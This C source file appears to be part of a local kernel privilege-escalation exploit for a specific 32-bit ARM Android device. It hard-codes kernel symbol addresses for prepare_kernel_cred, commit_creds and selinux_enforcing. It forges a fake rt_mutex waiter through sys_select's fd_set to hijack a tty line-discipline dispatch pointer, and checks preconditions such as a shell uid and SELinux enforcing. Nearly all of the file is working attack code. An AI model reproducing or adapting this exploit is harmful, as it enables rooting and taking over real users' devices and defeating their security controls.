#include "kara_ghostlock.h"

#include <errno.h>
#include <string.h>

const struct kara_profile KARA_PS7713_PROFILE = {
    .init_task = 0xc120d700u,
    .init_cred = 0xc1215300u,
    .prepare_kernel_cred = 0xc01524d0u,
    .commit_creds = 0xc0151f28u,
    .selinux_enforcing = 0xc14a1988u,
    .tty_ldiscs = 0xc14ab9f4u,
    .fake_lock = 0xc14aba40u,
    .ldisc_dispatch = 0xc05e950cu,
    .zero_word = 0xc0a0649cu,
    .ldisc_slot = 20,
};

void kara_build_select_stamp(struct kara_select_stamp *stamp,
                             const struct kara_profile *profile) {
    memset(stamp, 0, sizeof(*stamp));

    /* sys_select's first fd_set begins at stale waiter + 0x14. */
    stamp->in[1] = profile->init_task;       /* waiter + 0x18: task */
    stamp->in[2] = profile->fake_lock;       /* waiter + 0x1c: lock */
    stamp->in[3] = 0;                        /* waiter + 0x20: prio */
    stamp->in[4] = profile->ldisc_dispatch;  /* waiter + 0x24: ioctl */
}

size_t kara_collect_read_fds(const struct kara_select_stamp *stamp,
                             int *fds, size_t capacity) {
    size_t count = 0;
    for (size_t word = 0; word < KARA_SELECT_WORDS; ++word) {
        uint32_t value = stamp->in[word];
        for (unsigned bit = 0; bit < 32; ++bit) {
            if (!(value & (1u << bit)))
                continue;
            if (count < capacity)
                fds[count] = (int)(word * 32u + bit);
            ++count;
        }
    }
    return count;
}

uint32_t kara_preflight_missing(const struct kara_preflight *observed) {
    uint32_t missing = 0;
    if (!observed->arm32) missing |= KARA_GATE_ARM32;
    if (!observed->four_cpus) missing |= KARA_GATE_FOUR_CPUS;
    if (!observed->kernel_exact) missing |= KARA_GATE_KERNEL;
    if (!observed->device_kara) missing |= KARA_GATE_DEVICE;
    if (!observed->model_aftka) missing |= KARA_GATE_MODEL;
    if (!observed->build_exact) missing |= KARA_GATE_BUILD;
    if (!observed->uid_shell) missing |= KARA_GATE_UID;
    if (!observed->selinux_enforcing) missing |= KARA_GATE_SELINUX;
    if (!observed->cec_standby_blocked) missing |= KARA_GATE_CEC_GUARD;
    return missing;
}

int kara_live_confirmation_valid(const char *token) {
    return token && strcmp(token, KARA_LIVE_CONFIRMATION) == 0;
}

int kara_newer_build_request_valid(const char *actual, const char *requested) {
    size_t length = strlen(KARA_BASELINE_BUILD);
    if (!actual || !requested || strlen(actual) != length ||
        strlen(requested) != length || strcmp(actual, requested) != 0)
        return 0;
    for (size_t index = 0; index < length; ++index) {
        if (requested[index] < '0' || requested[index] > '9')
            return 0;
    }
    return strcmp(requested, KARA_BASELINE_BUILD) > 0;
}

int kara_experimental_confirmation_valid(const char *token) {
    return token && strcmp(token, KARA_EXPERIMENTAL_CONFIRMATION) == 0;
}

int kara_should_contain_ota(int experimental_newer) {
    return !experimental_newer;
}

int kara_parse_invocation(int argc, char **argv,
                          struct kara_invocation *invocation) {
    if (!invocation)
        return 0;
    invocation->mode = KARA_MODE_INVALID;
    invocation->requested_build = NULL;
    if (argc == 3 && strcmp(argv[1], "--probe-newer") == 0 &&
        kara_newer_build_request_valid(argv[2], argv[2])) {
        invocation->mode = KARA_MODE_PROBE_NEWER;
        invocation->requested_build = argv[2];
        return 1;
    }
    if (argc == 4 && strcmp(argv[1], "--live-newer") == 0 &&
        kara_newer_build_request_valid(argv[2], argv[2]) &&
        kara_experimental_confirmation_valid(argv[3])) {
        invocation->mode = KARA_MODE_LIVE_NEWER;
        invocation->requested_build = argv[2];
        return 1;
    }
    return 0;
}

int kara_command_length_valid(size_t length) {
    return length > 0 && length <= KARA_MAX_COMMAND;
}

int kara_phase_step(enum kara_phase *phase, enum kara_phase next) {
    if (!phase || next != (enum kara_phase)(*phase + 1))
        return 0;
    *phase = next;
    return 1;
}

int kara_tcp_mcast_copy_confirmed(int result, int saved_errno) {
    return result == -1 && saved_errno == EADDRNOTAVAIL;
}

int kara_kernel_pointer_result(int result, uint32_t *pointer) {
    uint32_t raw = (uint32_t)result;
    if (raw < 0xc0000000u || raw >= 0xf0000000u || (raw & 3u))
        return 0;
    if (pointer)
        *pointer = raw;
    return 1;
}

void kara_build_nonpreempting_sched_attr(struct kara_sched_attr *attr,
                                         int current_nice) {
    memset(attr, 0, sizeof(*attr));
    attr->size = sizeof(*attr);
    attr->sched_policy = KARA_SCHED_BATCH;
    attr->sched_nice = current_nice;
}
